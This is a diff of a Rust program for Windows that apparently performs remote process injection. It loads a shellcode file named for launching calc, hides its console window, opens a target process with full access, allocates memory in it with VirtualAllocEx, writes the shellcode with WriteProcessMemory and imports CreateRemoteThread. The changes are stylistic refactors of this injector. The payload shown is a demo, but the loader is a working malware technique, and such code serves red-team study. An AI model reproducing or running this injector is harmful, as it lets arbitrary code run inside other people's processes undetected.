@@ -1,6 +1,5 @@
 #![windows_subsystem = "windows"]
 
-use std::ffi::c_void;
 use std::mem::transmute;
 use std::ptr::{null, null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
@@ -11,8 +10,8 @@ use windows_sys::Win32::System::Memory::{
 };
 use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
 
-static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-static SIZE: usize = SHELLCODE.len();
+const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+const SIZE: usize = SHELLCODE.len();
 
 #[cfg(target_os = "windows")]
 fn main() {
@@ -43,17 +42,11 @@ fn main() {
             PAGE_READWRITE,
         );
 
-        if dest == null_mut() {
+        if dest.is_null() {
             eprintln!("VirtualAllocEx failed!");
         }
 
-        let res = WriteProcessMemory(
-            handle,
-            dest,
-            SHELLCODE.as_ptr() as *const c_void,
-            SIZE,
-            null_mut(),
-        );
+        let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
 
         if res == FALSE {
             eprintln!("WriteProcessMemory failed!");
